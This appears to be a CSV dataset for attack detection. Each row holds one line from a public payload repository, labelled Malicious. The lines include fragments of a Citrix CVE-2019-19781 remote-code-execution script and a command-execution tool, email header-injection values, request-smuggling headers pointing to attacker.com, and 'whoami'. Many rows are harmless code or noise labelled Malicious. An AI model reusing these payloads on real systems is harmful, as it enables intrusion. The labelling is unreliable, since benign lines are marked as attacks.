Payload,Signature,AttackType,Severity,MITRE,Label,Description
"""success"":false",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""success"":true",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/my-account,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/2fa/verify,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/my-account,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
#!/usr/bin/env python,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# # #,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import requests,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import string,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import random,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import re,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import sys,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from requests.packages.urllib3.exceptions import InsecureRequestWarning,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
print(""""CVE-2019-19781 - Remote Code Execution in Citrix Application Delivery Controller and Citrix Gateway"""")""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"print(""Found by Mikhail Klyuchnikov"")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"print("""")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  print(""[-] No URL provided"")",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
  sys.exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
while True:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    try:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"      command = input(""command > "")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
      if r.status_code == 200:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(""[+] Bookmark added"")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
      else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(""\n[-] Target not vulnerable or something went wrong"")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        sys.exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"      print(""[+] Result of the command: \n"")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
      print(replaced),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    except KeyboardInterrupt:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            print(""Exiting..."")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            break,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Accept: */*,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Content-Type: application/json,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Host: attacker.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# parameter pollution,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com&email=hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# array of emails,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# carbon copy,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com%0A%0Dcc:hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com%0A%0Dbcc:hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# separator,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com%20hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com|hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
malicious_payload,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[...],GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
cd smuggler,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
python3 smuggler.py -h,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
X:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
malicious_payload,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Transfer-Encoding: chunked,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Host: something.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
User-Agent: Smuggler/v1.0,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Content-Length: 83,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
0,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
X: X,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Host: attacker.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
X-Forwarded-Host: attacker.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
3. Then use the token in an URL like ",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Attacker account: """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"2. Craft a request which will overwrite the """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"docker run -v $PWD:/workdir davidanson/markdownlint-cli2:v0.15.0 ""**/*.md"" --config .github/.markdownlint.json --fix",CMDi_Unix,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
whoami,CMDi_Unix,Generic Payload,High,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[REDACTED],GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
10.10.10.10,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
10.10.10.11,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
User,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
P@ssw0rd,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
DC01,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
EXCHANGE01,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
WORKSTATION01,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
author,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
title,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
link,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
date,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
markdownlint,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
#!/usr/bin/python,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from __future__ import print_function,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from future import standard_library,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
standard_library.install_aliases(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from builtins import input,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from builtins import str,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import time,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import sys,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import os,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import subprocess,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import requests,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import readline,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import urllib.parse,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
RED = '\033[1;31m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
BLUE = '\033[94m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
BOLD = '\033[1m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
GREEN = '\033[32m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
OTRO = '\033[36m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
YELLOW = '\033[33m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ENDC = '\033[0m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
def cls():,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
cls(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
logo = BLUE+''',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
  ___   _____  ___    _   _  _____  ___,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 (  _`\(_   _)|  _`\ ( ) ( )(_   _)(  _`\,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 | (_(_) | |  | (_) )| | | |  | |  | (_(_),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 ( )_) | | |  | |\ \ | (_) |  | |  ( )_) |,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 `\____) (_)  (_) (_)(_____)  (_)  `\____),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        =[ Command Execution v3]=,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
              By @s1kr10s,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
'''+ENDC,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
print(logo),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
host = input(BOLD+"""" [+] HOST: """"+ENDC)""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
